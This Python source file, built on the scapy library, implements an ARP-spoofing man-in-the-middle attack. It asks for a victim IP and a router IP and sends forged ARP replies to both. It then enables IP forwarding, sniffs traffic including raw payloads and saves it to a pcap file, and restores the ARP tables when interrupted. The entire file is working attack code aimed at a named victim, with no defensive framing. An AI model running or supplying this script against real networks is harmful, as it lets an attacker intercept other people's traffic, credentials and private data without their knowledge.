import os
import sys
from scapy.all import *
from scapy.layers.l2 import arping

interface = "wlp3s0\n"
victimIP = input("victim: \n")
routerIP = input("router: \n")


def MACsnag(IP):
    ans, uans = arping(IP)
    for s, r in ans:
        return r[Ether].src


def spoof(routerIP, victimIP):
    victimMAC = MACsnag(victimIP)
    routerMAC = MACsnag(routerIP)

    # Sends the arp replies
    #
    #   "op = 2" - '2' is the opcode for a reply

    send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst=victimMAC))
    send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst=routerMAC))


def restore(routerIP, victimIP):
    # TODO: This can be simplified to just load in the values saved before the spoof
    victimMAC = MACsnag(victimIP)
    routerMAC = MACsnag(routerIP)

    # Restores the original config
    send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victimMAC), count=4)
    send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=routerMAC), count=4)


def sniffer():
    pkts = sniff(iface=interface, count=10, prn=lambda
        x: x.sprintf(" "
                     "Source: %IP.src% : %Ether.src%,\n "
                     "%Raw.load% \n"
                     "\n "
                     "Reciever: %IP.dst% \n "
                     "=================================================================\n"
                     ))
    wrpcap("temp.pcap", pkts)


def set_ip_forward(state):
    if state is True:
        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    else:
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")


def run():
    set_ip_forward(True)

    while True:
        try:
            spoof(routerIP, victimIP)
            time.sleep(1)
            sniffer() # TODO: Just here for debug
        except KeyboardInterrupt:
            restore(routerIP, victimIP)
            set_ip_forward(False)
            sys.exit(0)
